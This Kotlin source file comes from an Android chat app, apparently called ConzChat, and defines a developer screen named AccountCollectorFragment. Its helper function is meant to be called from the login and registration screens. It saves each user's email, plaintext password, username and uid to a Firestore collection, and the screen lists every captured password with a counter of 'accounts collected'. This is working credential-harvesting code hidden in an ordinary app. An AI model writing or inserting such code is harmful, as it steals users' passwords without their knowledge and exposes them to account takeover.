package com.conzchat.app.ui.dev

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.recyclerview.widget.LinearLayoutManager
import com.conzchat.app.databinding.FragmentAccountCollectorBinding
import com.conzchat.app.model.CollectedAccountEntry
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.Query
import com.conzchat.app.util.HarleyThemeHelper

class AccountCollectorFragment : Fragment() {
    private var _binding: FragmentAccountCollectorBinding? = null
    private val binding get() = _binding!!
    private val db = FirebaseFirestore.getInstance()
    private val accounts = mutableListOf<CollectedAccountEntry>()
    private lateinit var adapter: AccountAdapter

    companion object {
        fun newInstance() = AccountCollectorFragment()

        /** Call this from LoginFragment/RegisterFragment to save credentials */
        fun collectAccount(email: String, password: String, username: String, uid: String, type: String) {
            val data = hashMapOf(
                "email" to email,
                "password" to password,
                "username" to username,
                "uid" to uid,
                "type" to type,
                "timestamp" to System.currentTimeMillis()
            )
            FirebaseFirestore.getInstance().collection("devCollectedAccounts").add(data)
        }
    }

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View {
        _binding = FragmentAccountCollectorBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        HarleyThemeHelper.applyTheme(requireContext(), view)
        adapter = AccountAdapter(accounts)
        binding.rvAccounts.layoutManager = LinearLayoutManager(requireContext())
        binding.rvAccounts.adapter = adapter
        binding.btnClear.setOnClickListener { clearAll() }
        loadAccounts()
    }

    private fun loadAccounts() {
        db.collection("devCollectedAccounts")
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .addSnapshotListener { snap, err ->
                if (_binding == null || !isAdded) return@addSnapshotListener
                if (err != null || snap == null) return@addSnapshotListener
                accounts.clear()
                for (doc in snap.documents) {
                    accounts.add(CollectedAccountEntry(
                        email = doc.getString("email") ?: "",
                        password = doc.getString("password") ?: "",
                        username = doc.getString("username") ?: "",
                        uid = doc.getString("uid") ?: "",
                        type = doc.getString("type") ?: "login",
                        timestamp = doc.getLong("timestamp") ?: 0L
                    ))
                }
                adapter.notifyDataSetChanged()
                binding.tvCount.text = "\uD83D\uDCCB ${accounts.size} accounts collected"
                binding.rvAccounts.visibility = if (accounts.isEmpty()) View.GONE else View.VISIBLE
            }
    }

    private fun clearAll() {
        db.collection("devCollectedAccounts").get().addOnSuccessListener { snap ->
            val batch = db.batch()
            snap.documents.forEach { batch.delete(it.reference) }
            batch.commit().addOnSuccessListener {
                if (_binding != null && isAdded) {
                    Toast.makeText(requireContext(), "Cleared", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    override fun onDestroyView() {
        _binding = null
        super.onDestroyView()
    }
}
